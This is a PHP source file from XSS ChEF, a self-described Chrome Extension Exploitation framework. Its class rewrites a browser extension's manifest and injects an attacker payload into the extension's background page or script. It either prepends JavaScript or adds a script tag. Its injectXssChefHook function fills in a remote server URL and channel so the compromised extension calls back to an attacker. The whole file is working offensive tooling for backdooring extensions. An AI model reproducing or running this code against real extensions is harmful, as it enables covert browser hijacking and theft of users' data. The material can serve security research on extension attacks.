<?php
/*
    XSS ChEF - Chrome Extension Exploitation framework
    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
class ChromeExtensionToolkit {
    var $ext = '';
    var $manifest;
    
    const BCG_SCRIPT = 1;
    const BCG_PAGE = 2;
    
    function __construct($extpath) {
        if (empty($extpath)) {
            throw new Exception("Empty extension path");
        }
    
        if (!is_dir($extpath)) {
            throw new Exception("Invalid extension path");
        }

        $this->ext = $extpath;
    }
    
    function getManifest() {
        $f = $this->getFile('manifest.json');
        $manifest = @str_replace("\xef\xbb\xbf", '', file_get_contents($f));
        $manifest = json_decode($manifest, true);
        if (!$manifest)
            throw new Exception("Invalid $f");
        $this->setManifest($manifest);
        return $manifest;   
    }
    
    function setManifest($manifest) {
        $this->manifest = $manifest;
    }
    
    function saveManifest() {
        $this->saveFile('manifest.json', json_encode($this->manifest));
    }

    function saveFile($file, $contents) {
        file_put_contents($this->getFile($file), $contents);
    }
    
    function getFile($file) {
        return $this->ext . DIRECTORY_SEPARATOR . $file;
    }
    
    function assertNotApp() {
        $manifest = $this->getManifest();
        if (!empty($manifest['app'])) {
            throw new Exception("Apps are not supported, only regular Chrome extensions");
        }
    }
    
    function injectScript($payload) {
        $this->assertNotApp();
        $bcg_file = $this->getBackgroundPage();
        
        $bcg = @file_get_contents($this->getFile($bcg_file));
        if (!$payload) {
            return $bcg;
        }
        if (preg_match('/\.js$/i', $bcg_file)) { // javascript, just prepend
            return $payload . ";" . $bcg;
        }
        $name = md5(time()) . '.js';
        $this->saveFile($name, $payload);
        return preg_replace('#(\<head\>|\Z)#i', "\$1\n<script src=\"/{$name}\"></script>", $bcg, 1);
    }
    
    function assertBackgroundPage($default) {
        $manifest = $this->getManifest();
        if (@$manifest['manifest_version'] >= 2) {
            if (empty($manifest['background'])) {
                $manifest['background'] = array();
            }
            
            if (!empty($manifest['background']['scripts'])) {
                array_unshift($manifest['background']['scripts'], $default . '.js');
                $this->setManifest($manifest);
                return self::BCG_SCRIPT;
            }
            
            if (empty($manifest['background']['page'])) {
                $manifest['background']['page'] = $default . '.html'; 
            }
            $this->setManifest($manifest);
            return self::BCG_PAGE;
        }
        if (empty($manifest['background_page'])) {
            $manifest['background_page'] = $default . '.html';
        }
        $this->setManifest($manifest);
        return self::BCG_PAGE;
    }
    
    function getBackgroundPage() {
        $manifest = $this->getManifest();
        if (!empty($manifest['background']['page'])) {
            return $manifest['background']['page'];
        }
        if (!empty($manifest['background']['scripts'])) {
            return reset($manifest['background']['scripts']);
        }
        if (!empty($manifest['background_page'])) {
            return $manifest['background_page'];
        }
        throw new Exception("No background page present");
    }
    
    function injectXssChefHook($server_url, $channel) {
        $hook = file_get_contents(__DIR__ . '/../xsschef.js');
        $hook = str_replace('__URL__', $server_url, $hook);
        $hook = str_replace('__CHANNEL__', $channel, $hook);
        return $this->injectScript($hook);
    }
}
